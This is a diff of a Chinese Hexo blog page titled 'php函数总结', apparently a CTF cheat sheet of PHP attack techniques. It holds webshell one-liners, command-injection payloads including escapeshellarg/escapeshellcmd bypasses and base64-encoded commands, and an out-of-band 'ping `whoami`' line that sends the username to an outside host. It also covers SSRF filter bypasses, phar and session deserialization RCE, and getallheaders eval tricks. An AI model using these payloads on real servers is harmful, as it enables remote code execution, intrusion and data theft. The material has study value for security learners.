@@ -1,747 +1,638 @@
-
 <!DOCTYPE html>
 <html lang="zh-cn">
-    
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Hexo">
-    <title>php函数总结 - Hexo</title>
-    <meta name="author" content="John Doe">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
     
-    
-    
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"命令执行\n\nsystem1system('ls');\n\nexec1exec('ls');\n\nshell_exec ==&gt;``12shell_exec('ls');`ls`;\n\npcntl_exec1pcntl_exec ( string $path [, array $args [, array $envs ]] ) : void\n\n path必须是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 \n1pcntl_exec(&apos;/tmp/shell&apos;)\n\npopenpopen要配合fgets一起使用 才能输出想要的结果\n1234567&lt;?php$cmd=$_GET['cmd'];$a=popen($cmd,'r');while(!feof($a))&#123;\techo fgets($a);&#125;?&gt;\n\nproc_open12\n\npassthru执行外部程序并显示原始输出\n passthru ( string $command [, int &amp;$return_var ] ) : void \n1234&lt;?php$cmd=$_GET['cmd'];echo passthru($cmd);?&gt;\n\nbypassescapeshellcmd escapeshellarg 单引号逃逸\nescapeshellcmd原本是 为了防止命令注入的，但是两个连用就会出问题\n123127.0.0.1&apos; -v -d a=1 ==&gt; &apos;127.0.0.1&apos;\\&apos;&apos; -v -d a=1&apos; escapeshellarg先对单引号进行转义，然后在对左右两端分别加上单引号&apos;127.0.0.1&apos;\\&apos;&apos; -v -d a=1&apos; ==&gt; &apos;127.0.0.1&apos;\\\\&apos;&apos; -v -d a=1\\&apos; escapeshellcmd对\\ &apos;进行转义，对\\进行转义后，\\\\就起不到转义的作用了，&apos;&apos;就形成了一个空连接符，字符串末尾的&apos;成为了一个独立的单引号，所以escapashellcmd会对其进行转义\n\nOOB带外linux\n1ping `whoami`.xxx.xxx.io  #xxx为ceye的ip\n\nwindows\n1ping %USERNAME%.xxx.xxx.io\n\n编码绕过123456#写入文件echo bHM=|base64 &gt; /tmp/shell.sh#给权限chmod 777 /tmp/shell.sh#执行/tmp/shell.sh\n\n关键字的绕过12345空格 %0a $&#123;IFS&#125; %09 &lt; $IFS$9有时候会碰到分割两条命令的情况，可以用; %0a %0d | &amp; %00等还可以使用命令续行符\\\n\n $9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串! \n拼接绕过12345&lt;?php$a='sys';$b='tem';$a.$b($_GET['shell']);?&gt;\n\nshell拼接\n1a=l;b=s;$a$b\n\n代码执行eval1eval($_POST['shell']);\n\nassert1assert($_POST['shell']);\n\npreg_replace/e修饰符可以导致命令执行\n12$a='123';preg_replace('/[0-9]/e',$_GET['shell'],$a);\n\ncall_user_func123call_user_func($_GET['func'],$_GET['cmd']);func=assert&amp;cmd=phpinfo()\n\ncall_user_func_array123call_user_func_array($_GET['func'],$_GET['cmd']);func=assert&amp;cmd[]=phpinfo()\n\narray_map123array_map($_GET['func'],$_GET['cmd']);func=assert&amp;cmd[]=phpinfo()\n\narray_filter123array_filter($_GET[&apos;code&apos;],$_GET[&apos;func&apos;]);?func=assert&amp;code[]=phpinfo();\n\ncreate_function1234567create_function('$a,$b','return 111')==&gt;function a($a, $b)&#123;    return 111;&#125;\n\n两种注入形式\nno.1函数体的注入\n12345create_function($arg,\"echo\".$arg);==&gt;function name($arg)&#123;    echo $arg;&#125;\n\n代码注入\n12345678$arg=$_GET['arg'];$code=\"echo hello\".$arg.\";\";$func=create_function('$arg', $code);==&gt;    functions name($arg)&#123;    echo \"hello\".$arg.\";\"&#125;\n\n注入点在函数体内，闭合实际上是闭合的函数体，\n12\n\nno.2函数参数的注入\n以一道ctf为例 这个题还需要另一个trick，php的命名空间加上\\ 表示绝对路径，不加表示相对\n也就是说调用函数也可以\\create_function 使用绝对路径的形式调用\n12345678910$act = @$_GET['act'];$arg = @$_GET['arg'];if(preg_match('/^[a-z0-9_]*$/isD',$act)) &#123;    echo 'check';&#125; else &#123;    $act($arg,'');&#125; ==&gt;    function name($arg)&#123; &#125;\n\n注入点在参数内，函数体为空，无法在函数体内注入，可以闭合圆括号，构造RCE \n1?act=\\create_function&amp;arg=)&#123;&#125;;system(&apos;ls&apos;);/*\n\nob_start1bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )\n\n此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。\n内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。\n1234567&lt;?phpob_start(\"system\");echo $_GET['shell'];ob_end_flush();?&gt;    ?shell=whoami\n\nusort/uasort1ool usort ( array &amp;$array , callable $value_compare_func )\n\n本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。\nshell_1\n123usort(...$_GET);?1[]=test&amp;1[]=phpinfo();&amp;2=assert\n\nshell_2\n123usort($_GET, 'asse'.'rt');?1=1+1&amp;2=phpinfo();\n\nXXEDOMDocument1234567&lt;?php$data = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($data);print_r($dom);\n\nSimpleXMLElement12345&lt;?php$data = file_get_contents('php://input');$xml = new SimpleXMLElement($data);echo $xml-&gt;name;\n\nsimplexml_load_string12345&lt;?php$data = file_get_contents('php://input');$xml = simplexml_load_string($data);echo $xml-&gt;name;\n\nSSRFcurl_exec1234567&lt;?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); ?&gt;\n\nfile_get_contents1234$str=file_get_contents($_GET['shell']);echo $str;http://127.0.0.1/test.php?shell=http://192.168.110.145/index.html\n\nfsocksopen123456789101112131415161718192021&lt;?php    # 打开连接通道$fp = fsockopen($_GET['url'], 80, $errno, $errstr, 30);if (!$fp) &#123;    echo \"$errstr ($errno)&lt;br /&gt;\\n\";&#125; else &#123;    # 通道打开，模拟HTTP请求,http协议标准的换行是\\r\\n    $out = \"GET / HTTP/1.1\\r\\n\";    $out .= \"Host: 127.0.0.1\\r\\n\";    $out .= \"Connection: Close\\r\\n\\r\\n\";    # http模拟完成，发送给服务器    fwrite($fp, $out);    # 接受服务器的返回结果    while (!feof($fp)) &#123;        echo fgets($fp, 128);    &#125;    fclose($fp);&#125;?&gt; http://127.0.0.1/test.php?url=192.168.110.145/index.html\n\nbypassIP转换点分式&lt;==&gt;整数形式\n121945097072的十六进制表示是73 EF D3 70，每个字节转换成十进制表示就是115.239.211.112 115.239.211.112每部分准换成16进制是73 EF D3 70，转换成十进制就是1945097072。\n\n放上两个ip转换的脚本\nip转16进制\n1234567import socketfrom binascii import hexlify ary='192.168.1.1'packed_ip_addr = socket.inet_aton(ary)hexStr=hexlify(packed_ip_addr)print('IP:'+str(hexStr))\n\n测试 ok\n1GET /ssrf.php?url=http://0xc0a86e01/neiwang.php HTTP/1.1\n\nip转整数形式\n12345678910111213IP = \"192.168.110.1\"def addr2dec(addr):    \"将点分十进制IP地址转换成十进制整数\"    items = [int(x) for x in addr.split(\".\")]    return sum([items[i] &lt;&lt; [24, 16, 8, 0][i] for i in range(4)]) def dec2addr(dec):    \"将十进制整数IP转换成点分十进制的字符串IP地址\"    return \".\".join([str(dec &gt;&gt; x &amp; 0xff) for x in [24, 16, 8, 0]]) dec = addr2dec(IP)print decprint dec2addr(dec)\n\n测试 ok\n1GET /ssrf.php?url=http://3232263681/neiwang.php HTTP/1.1\n\nurl绕过1234.==&gt;。 127。0。0。1  测试 ok短网址  https://dwz.cn/  测试 没ok指向任意 ip 的域名xip.io, http://xxx.127.0.0.1.xip.io/  测试 ok  这个要注意xxx随意 但是不能没有GET /test.php?url=http://x.192.168.110.1.xip.io/neiwang.php HTTP/1.1\n\n变体字符\n12345678910ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n\nfilter_var使用特定的过滤器 过滤url\n1filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed\n\n常使用的过滤器\n12FILTER_VALIDATE_EMAIL 检查是否为有效邮箱FILTER_VALIDATE_URL 检查是否为有效url\n\n绕过\n12340://baidu.com:80,google.com0://baidu.com:80;google.com  0://baidu$goolge.com  //利用bash的可变变量$google被解析为空  只使用curl data://text.google.com/plain;base64,[code]  这里是可以xss的\n\nparse_urlhttps://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/#%E5%AE%9E%E6%88%98%E4%B8%80\nno.1 遇到///会返回flase12http://localhost///web/trick1/parse.php?sql=select直接返回flase\n\nno.2 遇到//把data当作path12345http://localhost/web/trick1//parse2.php?/home/binarycloud/则会被当做相对url，此时的parse2.php?/home/binarycloud/都会被当做是data[‘path’]而不再是query，导致可以绕过过滤但是需要注意的是：此问题存在php5.4.7以前\n\nno.3 遇到非法字符自动转为下划线_123?url=%11 变成了下划线array(1) &#123; [\"path\"]=&gt; string(1) \"_\" &#125;\n\nno.4 解析host12345678$url = 'http://username:password@hostname:9090/path?arg=value#anchor';parse_url解析的结果是?url=http://www.baidu.com@192.168.110.140array(3) &#123; [\"scheme\"]=&gt; string(4) \"http\" [\"host\"]=&gt; string(15) \"192.168.110.140\" [\"user\"]=&gt; string(13) \"www.baidu.com\" &#125; host变成了@后面的\n\nhost利用深入\nlibcurl和parse_url的解析差异parse_url\n1host: 匹配最后一个@后面符合格式的host\n\nlibcurl\n1host：匹配第一个@后面符合格式的host\n\n测试\n1http://u:p@a.com:80@b.com/index.php\n\nparse_url解析结果\n123456789101112array(5) &#123;  [\"scheme\"]=&gt;  string(4) \"http\"  [\"host\"]=&gt;  string(5) \"b.com\"  [\"user\"]=&gt;  string(1) \"u\"  [\"pass\"]=&gt;  string(10) \"p@a.com:80\"  [\"path\"]=&gt;  string(10) \"/index.php\"&#125;\n\n  前面的@a.com会被忽略掉   \nlibcurl解析结果\n12345schema: httphost: a.comuser: upass: pport: 80\n\n  后面的@b.com会被忽略掉   \n302跳转1234567&lt;?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header(\"Location: $scheme://$ip:$port/$data\");?&gt;\n\n测试12paylaod GET /test.php?url=http://192.168.110.145/302.php%3fs%3dhttp%26ip%3d192.168.110.1%26port%3d80%26data%3dneiwang.php HTTP/1.1\n\ntest.php\n12345678&lt;?php$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); //支持302跳转curl_exec($ch); curl_close($ch); ?&gt;\n\nneiwang.php\n123&lt;?phpvar_dump($_SERVER['REMOTE_ADDR']);?&gt;\n\n结果\n1string(13) \"192.168.110.1\"\n\nssrf还有几点问题\n1234PHP的curl默认不跟随302跳转curl7.43上gopher协议存在%00截断的BUG，v7.49可用file_get_contents()的SSRF，gopher协议不能使用URLencodefile_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败\n\n反序列化unserialize() 反序列化\nserialize()  序列化\n魔术方法123456789101112__construct  当对象初始化时触发__destory   当对象销毁的时触发__tostring 当对象被当作字符串的时触发  &quot;hello&quot;.$class.&quot;world&quot;  还有file_exist 这两种情况也会触发__call    当调用无法调用的函数时触发__get     当访问无法访问的属性时触发  无法调用还有无法访问包括 不存在的 还有私有变量__sleep 当一个对象被序列化时触发__wakeup 当一个对象被反序列化时触发\n\n主要是pop链的构造 还有绕过\n__wakeup 当成员属性的个数大于实际成员数目时，可绕过 并且在成员属性的个数前面加上+ 也可以\n私有变量 反序列化后 会生成两个%00 要注意\n反序列化还有一个特性 当反序列化足够多的字符时，后面的数据就会被扔掉 比如\n1a:1:&#123;s:4:&quot;user&quot;;s:51:&quot;O:4:&quot;user&quot;:1:&#123;s:4:&quot;test&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;&#125;&quot;;&#125;\n\n最后的三个字符”;}不影响反序列化，当反序列化足够多的字符时，剩下的数据，会被抛弃 前面有s:17的字符个数限制，所以当反序列化17个字符的时候，后面的就被仍掉了\npharphar是php中的一个打包文件，类似javaz中的war\nphp提供一个phar类允许我们处理phar文件相关操作。注意要将php.ini中的phar.readonly选项设置为Off或者在代码中加上 ini_set(“phar.readonly”,0); 这一句\nphar文件的meta-data部分在存储时会被序列化，解析时，会反序列化处理\n12345678910111213141516171819202122&lt;?php    class User&#123;    public $a;    public function __construct()    &#123;        $this-&gt;a='phpinfo();';    &#125;    public function __destruct()&#123;        eval($this-&gt;a);    &#125;&#125;@unlink('phar.phar'); $phar=new phar(\"phar.phar\");         //后缀名必须为phar$phar-&gt;startBuffering();             //开始缓冲Phar写操作$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //phar文件标志，可以加上其他文件头，以绕过检测 \"GIF89a\".\"&lt;?php __HALT_COMPILER();\"  $o=new User();$phar-&gt;setMetadata($o);             //添加meta-data数据$phar-&gt;addFromString(\"test.txt\",\"test\");$phar-&gt;stopBuffering();?&gt;\n\n12345678910111213141516&lt;?phpfile_get_contents($_GET['url']);class User&#123;    public $a;    public function __construct()    &#123;        $this-&gt;a='';    &#125;    public function __destruct()&#123;        eval($this-&gt;a);    &#125;&#125;?&gt;    ?url=phar://phar.phar/test.txt\n\n能够执行phpinfo()\nsession中的反序列化php有三种反序列化方式\n12345php_binary:键名的长度对应的ASCII字符+键名+键值经过serialize()函数序列化处理的值php:键名+竖线+键值经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4):经过serialize()函数序列化处理的值\n\n如果数据以php_serialize的方式序列化，以php的方式反序列化，就会出现问题\n通过php_serialize传入值，在加上一个竖线| ，伪造这样一串数据，\n1s:5:&quot;|code&quot;;\n\n这串数据当被php这种序列化方式解析的时候，键就变成了 s:5:”|  值就变成了 code 也就是值不再被当作字符串，而是单独的一部分被反序列化\n变量覆盖extract$parse_str全局变量注册auth变量没有设置，但是访问参数内有auth变量，auth会被自动的设置  前提   register_globals=ON   \n123if ($auth) &#123;echo \"private!\";&#125;\n\nimport_request_variables()12345678910&lt;?php$auth = \"0\";import_request_variables(\"G\");if ($auth == 1) &#123;echo \"private!\";&#125; else &#123;echo \"public!\";&#125;?&gt;\n\n访问auth=1 就会自动设置auth变量\n无参数函数超全局变量$_ENV$_ENV 通过getenv函数调用\ngetenv获取当前的环境变量array_rand 从数组中随机的获取元素array_flip() 交换数组中的键和值 键变为值 值变为键\ngetallheaders后台代码\n1eval($_GET['code']);\n\n请求头\n12345678910GET /fuzz.php?code=eval(getallheaders()[&apos;P1k&apos;]); HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1p1k: phpinfo();Connection: closeUpgrade-Insecure-Requests: 1\n\n这种情况有[]参数 不能绕过正则 要是有正则 可以通过current next end pos获取元素注意getallheaders 只适用于apache 因为他是apache的函数\n配置函数session12ini_set(&apos;session.serialize_handler&apos;, &apos;需要设置的引擎&apos;);session_start(&apos;serialize_handler=需要设置的引擎&apos;)\n\n读写文件readfile()\nfile_get_contents\nfile_put_contents\ndirname\n参考链接 https://www.fuzzer.xyz/2019/03/07/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/ \n http://j0k3r.top/2019/01/30/SSRF/#0x01-IP%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2 \n https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/ \n https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E5%AE%A1%E8%AE%A1%E9%A2%98%E4%BA%86%E8%A7%A3ssrf/ \n","dateCreated":"2019-10-13T08:42:43+08:00","dateModified":"2020-02-26T14:42:03+08:00","datePublished":"2019-10-13T08:42:43+08:00","description":"命令执行","headline":"php函数总结","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/10/13/php函数总结/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/10/13/php函数总结/"}</script>
-    <meta name="description" content="命令执行">
-<meta property="og:type" content="blog">
-<meta property="og:title" content="php函数总结">
-<meta property="og:url" content="http://p1keman.github.io/2019/10/13/php函数总结/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="命令执行">
-<meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2020-02-26T06:42:03.721Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php函数总结">
-<meta name="twitter:description" content="命令执行">
-    
-    
+    <title>
         
-    
-    
-    
-    
-    
-    <!--STYLES-->
-    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
-    <!--STYLES END-->
-    
-
-    
-
-    
+            php函数总结 |
         
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
     
-</head>
-
-    <body>
-        <div id="blog">
-            <!-- Define author's picture -->
-
+<link rel="stylesheet" href="/css/style.css">
 
     
+<link rel="stylesheet" href="/css/font-awesome.min.css">
 
-<header id="header" data-behavior="4">
-    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
-    <div class="header-title">
-        <a
-            class="header-title-link"
-            href="/ "
-            aria-label=""
-        >
-            Hexo
-        </a>
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"SBJ is SB."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-        
-            <a
-                class="header-right-picture "
-                href="#about"
-                aria-label="打开链接: /#about"
-            >
-        
-        
-        </a>
-    
-</header>
 
-            <!-- Define author's picture -->
-
-
-<nav id="sidebar" data-behavior="4">
-    <div class="sidebar-container">
-        
-        
-            <ul class="sidebar-buttons">
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/"
-                            
-                            rel="noopener"
-                            title="首页"
-                        >
-                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">首页</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-categories"
-                            
-                            rel="noopener"
-                            title="分类"
-                        >
-                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">分类</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-tags"
-                            
-                            rel="noopener"
-                            title="标签"
-                        >
-                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">标签</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-archives"
-                            
-                            rel="noopener"
-                            title="归档"
-                        >
-                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">归档</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link open-algolia-search"
-                            href="#search"
-                            
-                            rel="noopener"
-                            title="搜索"
-                        >
-                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">搜索</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="#about"
-                            
-                            rel="noopener"
-                            title="关于"
-                        >
-                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
             
         </ul>
-        
     </div>
-</nav>
 
-            
-            <div id="main" data-behavior="4"
-                 class="
-                        hasCoverMetaIn
-                        ">
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
                 
-<article class="post">
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">php函数总结</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2019-10-13 08:42:43
+    </span>
     
     
-        <div class="post-header main-content-wrap text-left">
-    
-        <h1 class="post-title">
-            php函数总结
-        </h1>
+
     
     
-        <div class="post-meta">
-    <time datetime="2019-10-13T08:42:43+08:00">
-	
-		    10月 13, 2019
-    	
-    </time>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-    
-</div>
+                    </div>
+                </div>
+            </div>
+        
 
-    
-    <div class="post-content markdown">
-        <div class="main-content-wrap">
+        <div class="article-content markdown-body">
             <h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><a id="more"></a>
 
-<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">'ls'</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="shell-exec-gt"><a href="#shell-exec-gt" class="headerlink" title="shell_exec ==&gt;``"></a>shell_exec ==&gt;``</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell_exec(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">`ls`;</span><br></pre></td></tr></table></figure>
 
-<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'ls'</span>);</span><br></pre></td></tr></table></figure>
 
-<h4 id="shell-exec-gt"><a href="#shell-exec-gt" class="headerlink" title="shell_exec ==&gt;``"></a>shell_exec ==&gt;``</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell_exec(<span class="string">'ls'</span>);</span><br><span class="line">`ls`;</span><br></pre></td></tr></table></figure>
-
-<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec ( string $path [, <span class="keyword">array</span> $args [, <span class="keyword">array</span> $envs ]] ) : void</span><br></pre></td></tr></table></figure>
-
+<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec ( <span class="keyword">string</span> <span class="variable">$path</span> [, <span class="keyword">array</span> <span class="variable">$args</span> [, <span class="keyword">array</span> <span class="variable">$envs</span> ]] ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
 <p> path必须是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(&apos;/tmp/shell&apos;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(&#39;&#x2F;tmp&#x2F;shell&#39;)</span><br></pre></td></tr></table></figure>
+
 
 <h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>popen要配合fgets一起使用 才能输出想要的结果</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$a=popen($cmd,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">while</span>(!feof($a))&#123;</span><br><span class="line">	<span class="keyword">echo</span> fgets($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
